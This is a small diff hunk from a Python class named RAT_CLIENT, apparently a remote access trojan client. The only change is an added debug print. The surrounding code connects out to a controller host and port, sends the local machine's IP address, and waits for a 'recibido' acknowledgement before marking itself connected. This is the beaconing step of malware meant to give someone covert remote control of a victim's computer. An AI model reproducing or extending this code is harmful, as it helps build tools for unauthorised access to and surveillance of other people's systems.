@@ -49,6 +49,8 @@ class RAT_CLIENT:
                 s.connect((self.host, self.port)) ##
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
+
+                print (sending)
                 command = s.recv(1024).decode()
                 if command == 'recibido':
                     connected = True
